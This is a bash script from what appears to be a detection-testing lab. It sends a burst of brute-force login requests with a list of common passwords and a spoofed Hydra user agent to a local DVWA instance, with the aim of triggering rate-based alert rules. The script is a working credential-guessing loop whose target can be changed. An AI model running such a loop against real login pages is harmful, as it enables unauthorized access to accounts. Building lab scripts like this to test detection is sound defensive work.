#!/usr/bin/env bash
# attack-brute.sh — Simulate a brute-force login burst against DVWA.
# Sends N attempts in a tight loop — designed to trigger brute-force detection rules
# (rule 100110 fires at ≥10/60s, rule 100111 escalates at ≥50/60s)

set -e
TARGET="${TARGET:-http://localhost:8080}"
N="${N:-60}"

passwords=(admin password 123456 letmein qwerty welcome dvwa root toor abc123
           pass test guest hello changeme master shadow secret iloveyou monkey)

echo "[brute] target=${TARGET} attempts=${N}"
for i in $(seq 1 "${N}"); do
  pw="${passwords[$RANDOM % ${#passwords[@]}]}"
  url="${TARGET}/vulnerabilities/brute/?username=admin&password=${pw}&Login=Login"
  curl -s -o /dev/null -A "Hydra/9.5" "$url"
done
echo "[brute] sent ${N} login attempts — check http://localhost:8000"
